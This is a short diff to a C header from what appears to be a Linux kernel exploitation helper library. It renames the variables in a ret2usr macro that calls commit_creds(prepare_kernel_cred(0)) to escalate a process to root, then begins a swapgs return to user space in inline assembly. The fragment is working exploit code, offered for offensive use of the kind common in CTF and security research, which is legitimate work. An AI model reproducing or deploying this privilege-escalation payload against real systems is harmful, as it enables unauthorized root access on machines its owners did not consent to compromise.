@@ -25,10 +25,11 @@ uint64_t posmod(int64_t i, int64_t n);
 
 #define DEFINE_RET2USR(func, state, pkc, cc, ret)                              \
   void func(void) {                                                            \
-    void *(*prepare_kernel_cred)(void *) = (void *(*)(void *))pkc;             \
-    void (*commit_creds)(void *) = (void (*)(void *))cc;                       \
+    void *(*__kpwn_internal_prepare_kernel_cred)(void *) =                     \
+        (void *(*)(void *))pkc;                                                \
+    void (*__kpwn_internal_commit_creds)(void *) = (void (*)(void *))cc;       \
                                                                                \
-    commit_creds(prepare_kernel_cred(0));                                      \
+    __kpwn_internal_commit_creds(__kpwn_internal_prepare_kernel_cred(0));      \
                                                                                \
     __asm__ __volatile__(".intel_syntax noprefix;"                             \
                          "swapgs;"                                             \
